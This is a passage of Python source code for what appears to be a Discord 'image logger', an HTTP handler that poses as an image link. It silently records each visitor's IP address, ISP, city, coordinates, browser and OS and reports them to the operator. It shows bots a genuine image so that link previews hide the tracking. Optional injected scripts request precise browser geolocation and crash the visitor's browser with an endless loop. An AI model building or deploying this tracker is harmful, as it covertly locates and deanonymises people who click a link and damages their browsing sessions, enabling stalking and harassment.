            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
